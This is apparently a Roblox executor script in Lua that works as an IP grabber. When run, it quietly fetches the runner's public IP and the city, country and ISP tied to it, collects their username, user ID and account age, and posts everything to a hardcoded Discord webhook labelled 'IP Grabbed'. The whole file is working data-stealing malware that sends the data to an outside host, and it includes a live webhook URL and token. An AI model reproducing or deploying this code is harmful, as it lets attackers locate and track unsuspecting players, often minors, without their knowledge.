local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local webhook = "https://discord.com/api/webhooks/1544062130389524623/9lI7Suxp2H5QgwD3Fx37ifFE23t3HObJn6PvYZ0oksEYNm4nxTM31jkf1iu048gwDpbS"

local function getIP()
    local success, result = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    if success then
        return result
    end
    return "failed"
end

local function getGeo(ip)
    local success, result = pcall(function()
        return game:HttpGet("http://ip-api.com/json/" .. ip)
    end)
    if success then
        return HttpService:JSONDecode(result)
    end
    return nil
end

local ip = getIP()
local geo = getGeo(ip)

local data = {
    ["content"] = "@everyone new execution",
    ["embeds"] = {{
        ["title"] = "IP Grabbed",
        ["color"] = 16711680,
        ["fields"] = {
            {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
            {["name"] = "UserId", ["value"] = tostring(LocalPlayer.UserId), ["inline"] = true},
            {["name"] = "IP", ["value"] = ip, ["inline"] = true},
            {["name"] = "Country", ["value"] = geo and geo.country or "n/a", ["inline"] = true},
            {["name"] = "City", ["value"] = geo and geo.city or "n/a", ["inline"] = true},
            {["name"] = "ISP", ["value"] = geo and geo.isp or "n/a", ["inline"] = true},
            {["name"] = "Account Age", ["value"] = tostring(LocalPlayer.AccountAge) .. " days", ["inline"] = true},
        },
        ["footer"] = {["text"] = "executor grab"}
    }}
}

local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request

if requestFunc then
    requestFunc({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
else
    pcall(function()
        HttpService:PostAsync(webhook, HttpService:JSONEncode(data))
    end)
end
